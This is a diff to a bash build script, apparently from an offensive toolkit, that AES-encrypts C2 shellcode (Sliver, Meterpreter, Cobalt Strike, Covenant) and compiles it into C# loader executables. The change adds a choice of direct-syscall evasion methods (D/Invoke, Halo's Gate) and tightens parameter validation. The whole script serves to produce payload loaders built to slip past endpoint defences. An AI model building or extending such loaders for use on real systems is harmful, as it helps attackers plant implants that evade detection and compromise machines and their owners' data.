@@ -18,11 +18,12 @@
 
 helpflag=0
 
-while getopts t:a:h flag
+while getopts t:a:s:h flag
 do
     case "${flag}" in
         t) c2type=${OPTARG};;
         a) arch=${OPTARG};;
+        s) syscalltype=${OPTARG};;
         h) helpflag=1;;
     esac
 done
@@ -30,12 +31,15 @@ done
 ## Add new C2 type here:
 type_array=("sliver|meterpreter|cobaltstrike|covenant");
 arch_array=("x32|x64");
+call_array=("dinvoke|halogate")
 
-help_message="""[*] Usage: $0 -t <c2type> -a <target_os_arch>
-                \n[*] Exg..:  $0 -t sliver -a x64
+help_message="""[*] Usage: $0 -t <c2type> -a <target_os_arch> -s <syscall_type>
+                \n[*] Exg..:  $0 -t sliver -a x64 -s halogate
                 \n\n[!] Make sure the shellcode bin file located in input folder and named as <c2type>.bin
                 \n[!] Currently c2type only support the following four:
                 \n[!] \t$type_array
+                \n[!] Current directly syscall methods only support the following two:
+                \n[!] \t$call_array
                 """
 
 if [ $helpflag == 1 ]; then
@@ -51,7 +55,7 @@ if [ -z "${c2type}" ]; then
     exit
 fi
 
-if [[ "${type_array[*]}" =~ "${c2type}" ]]; then
+if [[ "${type_array[@]}" =~ (^|[\|])"${c2type}"($|[\|]) ]]; then
     echo '[+] c2 type set to: '${c2type}
 else
     echo "[!] Error: currently c2type only support the following four:"
@@ -67,7 +71,7 @@ if [ -z "${arch}" ]; then
     exit
 fi
 
-if [[ "${arch_array[*]}" =~ "${arch}" ]]; then
+if [[ "${arch_array[*]}" =~ (^|[\|])"${arch}"($|[\|]) ]]; then
     echo '[+] target OS arch: '${arch}
 else
     echo '[!] Error: target OS arch only support the following two:'
@@ -76,6 +80,21 @@ else
     exit
 fi
 
+## Check if direct syscall type parameter is valid, otherwise exit
+if [ -z "${syscalltype}" ]; then
+    echo -e "[!] Error: direct syscal type can not be empty\n"
+    echo -e $help_message
+    exit
+fi
+
+if [[ "${call_array[*]}" =~ (^|[\|])"${syscalltype}"($|[\|]) ]]; then
+    echo '[+] direct syscall type set to: '${syscalltype}
+else
+    echo "[!] Error: currently direct syscall type only support the following two:"
+    echo -e "$call_array\n"
+    echo -e $help_message
+    exit
+fi
 
 rawscfilename=$c2type'.bin'
 
@@ -97,13 +116,13 @@ mkdir output
 ### Above are required parameters
 
 rawscfilename_enc=$rawscfilename'.enc'
-final_cs_filename='haloc2loader_'$c2type'.cs'
-final_exe_filename='haloc2loader_'$c2type'_'$arch'.exe'
+final_cs_filename='c2loader_'$syscalltype'_'$c2type'.cs'
+final_exe_filename='c2loader_'$syscalltype'_'$c2type'_'$arch'.exe'
 
 sleep 2
 
 # copy the cs template file
-cp haloloader_template.txt tmp/$final_cs_filename
+cp loader_${syscalltype}_template.txt tmp/$final_cs_filename
 # compile the AES encryptor
 mono-csc -out:encryptor.exe -platform:x64 encryptor.cs
 # encrypt the shellcode payload
